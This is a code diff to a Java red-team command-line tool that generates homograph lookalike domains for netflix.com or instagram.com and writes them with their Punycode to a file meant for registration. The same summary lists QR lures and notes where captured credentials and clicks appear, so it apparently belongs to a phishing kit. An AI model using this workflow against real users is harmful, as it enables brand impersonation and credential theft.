@@ -251,19 +251,11 @@ public class RedTeamCli {
                 }
             }
 
-            // Homograph (template = "netflix" ou "instagram", pas "netflix.com")
+            // Homograph : génère un fichier avec toutes les variantes + Punycode
             String domainForHomograph = "netflix".equals(template) ? "netflix.com" : "instagram.com";
-            java.util.List<String> homographVariants = new java.util.ArrayList<>();
+            String homographFilePath = null;
             if (wantHomograph) {
-                Target homTarget = new Target(domainForHomograph, -1);
-                Report homReport = new DefaultReport();
-                modules.get("homographgenerator").run(homTarget, homReport);
-                for (String f : homReport.getFindings()) {
-                    if (f.contains("  → ")) {
-                        String msg = f.replaceAll("\\[HomographGenerator\\]\\s*", "").replaceFirst(".*→\\s*", "").trim();
-                        homographVariants.add(msg);
-                    }
-                }
+                homographFilePath = HomographGenerator.runAndGetFilePath(domainForHomograph);
             }
 
             // Récapitulatif
@@ -278,14 +270,9 @@ public class RedTeamCli {
             if (wantQr && qrFilePath != null) {
                 System.out.println("  " + Ansi.cyan("QR") + "       › " + Ansi.bold(qrFilePath));
             }
-            if (wantHomograph && !homographVariants.isEmpty()) {
-                System.out.println("  " + Ansi.cyan("Homograph") + " › " + domainForHomograph + Ansi.dim(" (") + homographVariants.size() + Ansi.dim(" variantes)"));
-                for (int i = 0; i < Math.min(5, homographVariants.size()); i++) {
-                    System.out.println("    " + Ansi.dim("→ ") + homographVariants.get(i));
-                }
-                if (homographVariants.size() > 5) {
-                    System.out.println("    " + Ansi.dim("... et " + (homographVariants.size() - 5) + " autres"));
-                }
+            if (wantHomograph && homographFilePath != null) {
+                System.out.println("  " + Ansi.cyan("Homograph") + " › " + Ansi.bold(homographFilePath));
+                System.out.println(Ansi.dim("    Fichier avec variantes + Punycode pour enregistrement"));
             }
             System.out.println(Ansi.dim("  Les identifiants et clics s'afficheront ici."));
             System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
